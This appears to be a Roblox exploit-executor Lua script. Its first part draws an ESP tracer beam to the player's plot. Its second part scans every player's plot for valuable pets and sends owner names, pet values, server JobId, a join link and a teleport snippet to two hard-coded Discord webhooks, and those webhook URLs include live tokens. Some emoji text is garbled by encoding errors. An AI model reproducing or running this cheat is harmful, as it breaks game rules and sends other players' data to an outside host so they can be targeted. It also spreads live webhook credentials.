getgenv().ESPTracers = true

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local Workspace = game:GetService("Workspace")

local PlotController = require(ReplicatedStorage.Controllers:WaitForChild("PlotController"))
local LocalPlayer = Players.LocalPlayer

local TARGET_WIDTH = 0.3
local FADE_TIME = 0.35
local RAINBOW_SPEED = 0.30
local BRIGHTNESS_ON = 10
local BRIGHTNESS_OFF = 0.5

local currentBeam, currentAttach0, currentAttach1, plotSignHighlight = nil, nil, nil, nil
local hue = 0
local selectionBoxes = {}
local originalProps = {}

local function GetMyPlotModel()
	local ok, myPlot = pcall(function() return PlotController.GetMyPlot() end)
	if not ok or not myPlot then return nil end
	return myPlot.PlotModel
end

local function GetMyPlotSignSurface()
	local plot = GetMyPlotModel()
	if not plot then return nil end

	local sign = plot:FindFirstChild("PlotSign")
	if sign and sign:FindFirstChild("SurfaceGui") then
		return sign.SurfaceGui
	end
	return nil
end

local function tweenProperty(instance, props, info)
	return TweenService:Create(instance, info or TweenInfo.new(FADE_TIME, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), props)
end

local function savePartOriginal(part)
	if not part or not part:IsA("BasePart") then return end
	if originalProps[part] then return end
	originalProps[part] = {
		Color = part.Color,
		Material = part.Material,
	}
end

local function restoreAllOriginals()
	for part, props in pairs(originalProps) do
		if part and part.Parent then
			pcall(function()
				part.Color = props.Color
				part.Material = props.Material
			end)
		end
	end
	originalProps = {}
	for _, sb in ipairs(selectionBoxes) do
		if sb and sb.Parent then
			pcall(function() sb:Destroy() end)
		end
	end
	selectionBoxes = {}
end

local function applyDecorationsOutline()
	local plot = GetMyPlotModel()
	if not plot or not plot:FindFirstChild("Decorations") then return end

	for _, deco in ipairs(plot.Decorations:GetDescendants()) do
		if deco:IsA("BasePart") then
			savePartOriginal(deco)
			pcall(function()
				deco.Color = Color3.fromRGB(30, 35, 30)
			end)

			local sb = Instance.new("SelectionBox")
			sb.Name = "Decor_Outline"
			sb.Adornee = deco
			sb.LineThickness = 0.05
			sb.Color3 = Color3.fromRGB(255, 0, 0)
			sb.SurfaceTransparency = 1
			sb.Parent = deco
			table.insert(selectionBoxes, sb)
		end
	end
end

local function cleanup()
	if currentBeam then pcall(function() currentBeam:Destroy() end) end
	if currentAttach0 then pcall(function() currentAttach0:Destroy() end) end
	if currentAttach1 then pcall(function() currentAttach1:Destroy() end) end
	if plotSignHighlight then pcall(function() plotSignHighlight:Destroy() end) end
	currentBeam, currentAttach0, currentAttach1, plotSignHighlight = nil, nil, nil, nil

	restoreAllOriginals()
end

local function createEsp()
	cleanup()
	if not getgenv().ESPTracers then return end

	local char = LocalPlayer.Character
	if not char or not char:FindFirstChild("HumanoidRootPart") then return end
	local surface = GetMyPlotSignSurface()
	if not surface then
		warn("")
		return
	end

	currentAttach0 = Instance.new("Attachment", char.HumanoidRootPart)
	currentAttach1 = Instance.new("Attachment", surface)

	local beam = Instance.new("Beam")
	beam.Attachment0 = currentAttach0
	beam.Attachment1 = currentAttach1
	beam.FaceCamera = true
	beam.Width0 = 0
	beam.Width1 = 0
	beam.LightInfluence = 0
	beam.Brightness = BRIGHTNESS_OFF
	beam.Transparency = NumberSequence.new(0.08)
	beam.Parent = surface
	currentBeam = beam

	local highlight = Instance.new("Highlight")
	highlight.Name = "PlotSignHighlight"
	highlight.Adornee = surface
	highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
	highlight.FillTransparency = 0.5
	highlight.OutlineTransparency = 0.1
	highlight.Parent = Workspace
	plotSignHighlight = highlight

	local ti = TweenInfo.new(FADE_TIME, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	tweenProperty(beam, { Width0 = TARGET_WIDTH, Width1 = TARGET_WIDTH, Brightness = BRIGHTNESS_ON }, ti):Play()

	applyDecorationsOutline()
end

RunService.RenderStepped:Connect(function(dt)
	if not currentBeam then return end
	hue = (hue + dt * RAINBOW_SPEED) % 1
	local color = Color3.fromHSV(hue, 1, 1)

	pcall(function()
		currentBeam.Color = ColorSequence.new(color)
		if plotSignHighlight then
			plotSignHighlight.FillColor = color
			plotSignHighlight.OutlineColor = color
		end
	end)
end)

LocalPlayer.CharacterAdded:Connect(function()
	task.wait()
	createEsp()
end)

createEsp()

-- âš™ï¸ CONFIG
getgenv().webhookHigh = "https://discord.com/api/webhooks/1436766023280758896/SZubNXujYYMfPcbs5hvM0Q8oJzJ7K-4ZAqi8ahdi5paV4TDBn21Q-CFxB14fQUQbzfve" -- â‰¥10M
getgenv().webhookLow  = "https://discord.com/api/webhooks/1436766256794435805/9WJJu9E0U7bAHVlBXwkSms45wVxf3xY__4Lz7cssKqM8ZGyJg2qOe6CfdZtKMDspL5fE" -- 1Mâ€“7M
getgenv().HighMin = 10_000_000
getgenv().LowMin  = 1_000_000
getgenv().LowMax  = 9_000_000

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")

local lastColor = nil

local function getRandomColor()
    local color
    repeat
        local r = math.random(0, 255)
        local g = math.random(0, 255)
        local b = math.random(0, 255)
        color = bit32.lshift(r, 16) + bit32.lshift(g, 8) + b
    until color ~= lastColor
    lastColor = color
    return color
end

local function parseMoney(str)
    if not str or str == "" then return 0 end
    local num, suffix = str:match("([%d%.]+)%s*([KMBT]?)")
    num = tonumber(num)
    if not num then return 0 end
    local mult = ({ K=1e3, M=1e6, B=1e9, T=1e12 })[suffix:upper()] or 1
    return num * mult
end

local function getPlotOwner(plot)
    local sign = plot:FindFirstChild("PlotSign")
    if sign and sign:FindFirstChild("SurfaceGui") then
        local frame = sign.SurfaceGui:FindFirstChild("Frame")
        if frame and frame:FindFirstChild("TextLabel") then
            return tostring(frame.TextLabel.Text)
        end
    end
    return "Unknown Owner"
end

local function getObjectText(obj)
    if not obj then return nil end
    if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
        return obj.Text
    elseif obj:IsA("StringValue") or obj:IsA("IntValue") or obj:IsA("NumberValue") then
        return obj.Value
    else
        return obj.Name
    end
end

local function scanPets(plot)
    local pets = {}
    local owner = getPlotOwner(plot)
    for _, obj in ipairs(plot:GetDescendants()) do
        local display, gen
        for _, child in ipairs(obj:GetDescendants()) do
            local n = child.Name:lower()
            if n:match("displayname") or n:match("display") then
                display = child
            elseif n:match("generation") or n:match("gen") then
                gen = child
            end
        end

        if display and gen then
            local nameText = getObjectText(display) or "???"
            local genText = getObjectText(gen) or "$???/s"
            local fullText = genText
            local value = parseMoney(genText)

            table.insert(pets, {
                name = nameText,
                gen = fullText,
                value = value,
                owner = owner
            })
        end
    end
    return pets
end

local function sendWebhook(pets, webhookURL, label)
    if #pets == 0 or not webhookURL then return end

    local owner = pets[1].owner or "Unknown Owner"
    local lines = {}
    for _, pet in ipairs(pets) do
        table.insert(lines, string.format("â€¢ %s [**%s**]", pet.name, pet.gen))
    end
    local petBlock = table.concat(lines, "\n")

    local joinLink = string.format(
        "https://chillihub1.github.io/chillihub-joiner/?placeId=%d&gameInstanceId=%s",
        game.PlaceId, game.JobId
    )

    local tpScript = string.format(
        "game:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s', game.Players.LocalPlayer)",
        game.PlaceId, game.JobId
    )

    local embed = {
        username = "ğŸ›°ï¸ ğƒğğ§ğŠğšğ¢",
        embeds = {{
            title = "**" .. label .. " | ğƒğğ§ğŠğšğ¢ ğğ¨ğ­ğ¢ğŸğ²**",
            description = string.format(
            "ğŸ” **ğ…ğ¨ğ®ğ§ğ %d ğğğ­ğ¬!** | ğŸ‘¤ **ğğ°ğ§ğğ«:** %s\n\n%s\n\nğŸ‘¥ **ğğ¥ğšğ²ğğ«ğ¬**\n%d / %d\nğŸ†” **ğ‰ğ¨ğ›ğˆğƒ**\n%s\nğŸŒ **ğ‰ğ¨ğ¢ğ§ ğ‹ğ¢ğ§ğ¤**\n[ğ‚ğ¥ğ¢ğœğ¤ ğ­ğ¨ ğ‰ğ¨ğ¢ğ§](%s)\nğŸ“œ **ğ“ğğ¥ğğ©ğ¨ğ«ğ­**\n```lua\n%s\n```",
           #pets, owner, petBlock, #Players:GetPlayers(), Players.MaxPlayers, game.JobId, joinLink, tpScript
    ),
            color = getRandomColor(), 
            footer = { text = "ğŒğšğğ ğ›ğ² ğŠğ¡ğšğ¢ğ§ğ ğ®ğ²ğğ§" },
            timestamp = DateTime.now():ToIsoDate()
        }}
    }

    local json = HttpService:JSONEncode(embed)
    local req = http_request or request or (syn and syn.request) or (http and http.request)
    if not req then return end

    pcall(function()
        req({
            Url = webhookURL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = json
        })
    end)
end

local sent = {}
task.spawn(function()
    while true do
        for _, plot in pairs(Workspace.Plots:GetChildren()) do
            local allPets = scanPets(plot)
            local high, low = {}, {}

            for _, pet in ipairs(allPets) do
                local id = pet.name .. "|" .. pet.gen .. "|" .. pet.owner
                if not sent[id] then
                    if pet.value >= getgenv().HighMin then
                        table.insert(high, pet)
                        sent[id] = true
                    elseif pet.value >= getgenv().LowMin and pet.value <= getgenv().LowMax then
                        table.insert(low, pet)
                        sent[id] = true
                    end
                end
            end

            if #high > 0 then
                sendWebhook(high, getgenv().webhookHigh, "ğŸğŸ-ğŸğŸğŸğ¦")
            end
            if #low > 0 then
                sendWebhook(low, getgenv().webhookLow, "ğŸ-ğŸğŸğ¦")
            end
        end
        task.wait(1)
    end
end)
